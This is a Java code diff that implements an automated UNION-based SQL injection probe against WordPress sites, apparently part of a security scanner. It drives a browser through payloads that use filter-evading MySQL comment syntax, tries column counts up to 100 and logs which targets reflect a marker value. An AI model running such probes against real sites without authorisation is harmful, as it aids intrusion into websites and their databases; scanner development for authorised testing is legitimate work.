@@ -361,8 +361,73 @@ public class Model {
 		}).start();
 	}
 	
-	public void testSQLiWordpress(String url, final int numLog){
-		System.out.println("This is testSQLiWordpress method but have no content.");
+	public void testSQLiWordpress(String fullUrl, final int numLog){
+		this.setInitiate();
+		//final String url = getOnlyHostName(fullUrl);
+		final String url = fullUrl;
+		this.setTestRunning(true);
+		
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+
+				FileManager filemanager = new FileManager();
+				filemanager.setReader("Wordpress//SQLInjection");
+				filemanager.setWriter("Wordpress-log" + (numLog + 1) + ".txt");
+				
+				String temp;
+				String query = "-5+/*!12345UNION*/+/*!12345SELECT*/+";
+				String endQuery = "+--";
+				
+				int numOfColumn = 100; // defined number of columns of table in database
+				String checkWPSQLi = "999999999999999999999999999999";
+				
+				filemanager.writeLine("================================================================");
+				filemanager.writeLine(url + " SQL Injection " + getCurrentDateTime());
+				filemanager.writeLine("================================================================");
+				
+				while((temp = filemanager.readLineAllFile()) != null){
+					System.out.println(url + temp);
+					
+					try {
+						
+						String tempColumn = "";
+						String sourcePage = "";
+						boolean resultTesting = false;
+						
+						for(int i = 1; i <= numOfColumn; i++){
+							
+							tempColumn += checkWPSQLi;
+							
+							driver.get(url + temp + query + tempColumn + endQuery);
+							sourcePage = driver.getPageSource();
+							
+							if(sourcePage.indexOf(checkWPSQLi) >= 0){
+								resultTesting = true;
+								break;
+							}
+							
+							tempColumn += ",";
+							
+						}
+						
+						filemanager.writeLine(temp + query + tempColumn + endQuery);
+						
+						if(resultTesting) filemanager.writeLine("Yes");
+						else filemanager.writeLine("No");
+
+						
+					} catch (Exception e){
+						e.printStackTrace();
+					}
+					
+				}
+				
+				filemanager.close();
+				
+				setTestRunning(false);
+			}
+		}).start();
 	}
 	
 	public void testXSSWordpress(String url, final int numLog){
